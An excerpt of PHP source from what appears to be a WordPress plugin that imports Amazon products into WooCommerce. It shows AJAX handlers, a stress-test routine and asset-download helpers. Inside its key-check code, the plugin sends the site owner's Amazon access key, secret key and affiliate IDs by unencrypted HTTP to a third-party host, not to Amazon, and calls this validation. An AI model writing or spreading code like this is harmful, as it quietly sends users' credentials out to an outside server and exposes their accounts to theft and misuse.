...
if(class_exists('AmazonWooCommerceAmazonHelper') != true) {
	class AmazonWooCommerceAmazonHelper extends AmazonWooCommerce 
	{
		...
		public function __construct( $the_plugin=array() ) 
		{
			...
			// ajax actions
			add_action('wp_ajax_AmazonWooCommerceCheckAmzKeys', array( $this, 'check_amazon') );
			add_action('wp_ajax_AmazonWooCommerceImportProduct', array( &$this, 'getProductDataFromAmazon' ));
			
			add_action('wp_ajax_AmazonWooCommerceStressTest', array( &$this, 'stress_test' ));
		}
		...
		public function stress_test()
		{
			...
			if( $action == 'import_images' ){
				...
				if( isset($_SESSION["AmazonWooCommerce_test_product"]) && count($_SESSION["AmazonWooCommerce_test_product"]) > 0 ){
					$product = $_SESSION["AmazonWooCommerce_test_product"];
			...
			if( $action == 'insert_product' ){
				if( isset($_SESSION["AmazonWooCommerce_test_product"]) && count($_SESSION["AmazonWooCommerce_test_product"]) > 0 ){
					...
					if( (int) $insert_id > 0 ){
						...
						$_SESSION["AmazonWooCommerce_test_product"]['local_id'] = $insert_id;
						$return = array( 
							'status' => 'valid',
				...
				if( $asin != "" ){
					...
					if($product['Items']["Request"]["IsValid"] == "True"){
						...
						if (isset($product['Items']['Item']) && count($product['Items']['Item']) > 0) {
							...
							$_SESSION['AmazonWooCommerce_test_product'] = $retProd;
						}
		...
		{
			//echo 'nidobda';
			//print_r($this->amz_settings);
			//die();
			//echo 'http://datafeedplus.azurewebsites.net/bda?CHECK=api_key&'.$this->amz_settings[0]->AccessKeyID.'&api_secret='.$this->amz_settings[0]->AccessKeyID.'&api_affilate='.$this->amz_settings[0]->AffiliateID[0]->com;
			$theBody = wp_remote_retrieve_body( wp_remote_get('http://datafeedplus.azurewebsites.net/bdacheck?api_key='.urlencode($this->amz_settings['AccessKeyID']).'&api_secret='.urlencode($this->amz_settings['SecretAccessKey']).'&api_affilate='.urlencode(json_encode($this->amz_settings['AffiliateID']))) );
			if($theBody == 'Good'){
			...
			//echo( json_encode($this->amz_settings) );
		...
		public function get_asset_by_id( $asset_id, $inprogress=false, $include_err=false ) {
			...
			return $AmazonWooCommerceAssetDownloadCron->get_asset_by_id( $asset_id, $inprogress, $include_err );
		}
		...
		public function get_asset_by_postid( $nb_dw, $post_id, $include_variations, $inprogress=false, $include_err=false ) {
			...
			return $AmazonWooCommerceAssetDownloadCron->get_asset_by_postid( $nb_dw, $post_id, $include_variations, $inprogress, $include_err );
		}
		...
		public function get_asset_multiple( $nb_dw='all', $inprogress=false, $include_err=false ) {
			...
			return $AmazonWooCommerceAssetDownloadCron->get_asset_multiple( $nb_dw, $inprogress, $include_err );
		}
